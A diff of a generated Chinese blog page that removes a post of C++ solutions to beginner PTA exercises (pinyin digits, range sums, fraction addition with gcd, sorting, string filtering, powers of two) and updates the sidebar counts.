-<h3 id="c-版本"><a href="#c-版本" class="headerlink" title="c++版本"></a>c++版本</h3><blockquote>
-<p>思路总体一样的</p>
-<p>但看起来更简洁，，，<del>如果会写的话，，，TAT</del></p>
-</blockquote>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;map&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">map</span>&lt;<span class="keyword">char</span>,<span class="built_in">string</span>&gt; mmap;</span><br><span class="line">    mmap[<span class="string">'-'</span>] = <span class="string">"fu"</span>;</span><br><span class="line">    mmap[<span class="string">'0'</span>] = <span class="string">"ling"</span>;</span><br><span class="line">    mmap[<span class="string">'1'</span>] = <span class="string">"yi"</span>;</span><br><span class="line">    mmap[<span class="string">'2'</span>] = <span class="string">"er"</span>;</span><br><span class="line">    mmap[<span class="string">'3'</span>] = <span class="string">"san"</span>;</span><br><span class="line">    mmap[<span class="string">'4'</span>] = <span class="string">"si"</span>;</span><br><span class="line">    mmap[<span class="string">'5'</span>] = <span class="string">"wu"</span>;</span><br><span class="line">    mmap[<span class="string">'6'</span>] = <span class="string">"liu"</span>;</span><br><span class="line">    mmap[<span class="string">'7'</span>] = <span class="string">"qi"</span>;</span><br><span class="line">    mmap[<span class="string">'8'</span>] = <span class="string">"ba"</span>;</span><br><span class="line">    mmap[<span class="string">'9'</span>] = <span class="string">"jiu"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">string</span> s ;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;s;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; s.length()<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;mmap[s[i]]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;mmap[s[i]];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="L1-008-求整数段和"><a href="#L1-008-求整数段和" class="headerlink" title="L1-008 求整数段和"></a>L1-008 求整数段和</h2><blockquote>
-<p><del>easy</del></p>
-</blockquote>
-<h3 id="每个数字占5个字符宽度"><a href="#每个数字占5个字符宽度" class="headerlink" title="每个数字占5个字符宽度"></a>每个数字占5个字符宽度</h3><p>使用格式化字符串 =&gt; <del>快乐</del></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> a,b;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;a&gt;&gt;b;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = a,len=<span class="number">1</span>; i &lt;= b ; ++i,len++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%5d"</span>,i);</span><br><span class="line">        sum += i;</span><br><span class="line">        <span class="keyword">if</span>(len % <span class="number">5</span> ==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">            len = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((b-a+<span class="number">1</span>)%<span class="number">5</span>==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"Sum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;<span class="string">"\nSum = "</span>&lt;&lt;sum&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="L1-009-N个数求和"><a href="#L1-009-N个数求和" class="headerlink" title="L1-009 N个数求和"></a>L1-009 N个数求和</h2><blockquote>
-<p>首先计算分数加法公式：</p>
-<p>![img](file:///C:\Users\YCNN\Documents\Tencent Files\1187691781\Image\C2C\9CFF06029FD196D5E19F7D9FF8F6B771.png)</p>
-<p>然后计算结果分子分母的最大公约数，然后相除，得到最简分数</p>
-<p>这里需要考虑的地方：</p>
-<ol>
-<li>分母小于0 =&gt; 把符号换到分子上去</li>
-<li>分子小于0，说明为0，为了方便后期的计算，将分母置为0，防止该数的影响</li>
-</ol>
-<p>最后，根据能否整除，输出不同的结果。</p>
-</blockquote>
-<h3 id="scanf输入"><a href="#scanf输入" class="headerlink" title="scanf输入"></a>scanf输入</h3><p>这里使用scanf输入，，因为知道两个数字中间一定有一个/，可以简化，，，不用特意接受字符’/‘</p>
-<h3 id="最大公约数"><a href="#最大公约数" class="headerlink" title="最大公约数"></a>最大公约数</h3><p>固定格式：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="comment">//求最大公约数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gcd</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> b == <span class="number">0</span> ? a : gcd(b,a % b);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">beauty</span><span class="params">(<span class="keyword">int</span> &amp;a1,<span class="keyword">int</span> &amp;b1)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(b1 &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        a1 = -a1;</span><br><span class="line">        b1 = -b1;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 == <span class="number">0</span>)&#123;</span><br><span class="line">        b1 = <span class="number">1</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">int</span> simple = gcd(<span class="built_in">abs</span>(a1),<span class="built_in">abs</span>(b1));</span><br><span class="line">        a1 /= simple;</span><br><span class="line">        b1 /= simple;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="keyword">int</span> a1,b1,a2,b2;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a1,&amp;b1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n<span class="number">-1</span>; ++i) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">"%d/%d"</span>,&amp;a2,&amp;b2);</span><br><span class="line">        a1 = a1 * b2 + a2 * b1;</span><br><span class="line">        b1 = b1 * b2;</span><br><span class="line">        beauty(a1,b1);</span><br><span class="line">    &#125;</span><br><span class="line">    beauty(a1,b1);<span class="comment">//如果只有一个式子，不会进入循环，，，但是输入可能不是最简的</span></span><br><span class="line">    <span class="keyword">if</span>(b1 == <span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(a1 &lt; b1)&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;a1/b1&lt;&lt;<span class="string">" "</span>&lt;&lt;a1 % b1&lt;&lt;<span class="string">"/"</span>&lt;&lt;b1&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="L1-010-比较大小"><a href="#L1-010-比较大小" class="headerlink" title="L1-010 比较大小"></a>L1-010 比较大小</h2><blockquote>
-<p>只是对三个数排序，，，非常简单</p>
-</blockquote>
-<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><p>头文件</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br></pre></td></tr></table></figure>
-
-<p>使用</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sort(arr,arr+<span class="number">3</span>);<span class="comment">//arr是数组名，3是arr的长度</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> arr[<span class="number">3</span>];</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;arr[<span class="number">0</span>]&gt;&gt;arr[<span class="number">1</span>]&gt;&gt;arr[<span class="number">2</span>];</span><br><span class="line">    sort(arr,arr+<span class="number">3</span>);</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;arr[<span class="number">0</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">1</span>]&lt;&lt;<span class="string">"-&gt;"</span>&lt;&lt;arr[<span class="number">2</span>]&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="L1-011-A-B"><a href="#L1-011-A-B" class="headerlink" title="L1-011 A-B"></a>L1-011 A-B</h2><blockquote>
-<p><del>本来是用eclipse的replace做的，但是超时了，，，555</del></p>
-<p><img src="/2021/03/19/10-59-undefined/C:%5CUsers%5CYCNN%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210319201138492.png" alt="image-20210319201138492"></p>
-<p>正确的思路：</p>
-<p>遍历第二个字符串，用长度为256（ascii表长度）的数组记录又那些出现过的字符，最后再对第一个字符串遍历，根据数组是否出现过，，，。这里数组的存储的index就是字符串的ascii码【这点比较interesting】</p>
-</blockquote>
-<h3 id="c-输入一行"><a href="#c-输入一行" class="headerlink" title="c++输入一行"></a>c++输入一行</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getline(<span class="built_in">cin</span>,a);</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">string</span> a,b;</span><br><span class="line">    <span class="keyword">int</span> mark[<span class="number">256</span>];</span><br><span class="line">    getline(<span class="built_in">cin</span>,a);</span><br><span class="line">    getline(<span class="built_in">cin</span>,b);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; b.length() ; ++i) &#123;</span><br><span class="line">        mark[b[i]] = <span class="number">1</span>;<span class="comment">//直接将字符串的ascii码作为数组下表</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; a.length() ; ++j) &#123;</span><br><span class="line">        <span class="keyword">if</span>(mark[a[j]] == <span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;a[j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h2 id="L1-012-计算指数"><a href="#L1-012-计算指数" class="headerlink" title="L1-012 计算指数"></a>L1-012 计算指数</h2><blockquote>
-<p>pow（底数，幂次）的结果是double型的，，，，不知道为什么不能强转到int，，，</p>
-<p>就输出是f了</p>
-</blockquote>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span>&gt;&gt;n;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"2^%d = %.f"</span>,n,<span class="built_in">pow</span>(<span class="number">2</span>,n));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -2213,19 +2167,19 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">56</span>
+          <span class="site-state-item-count">57</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
-        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-count">38</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
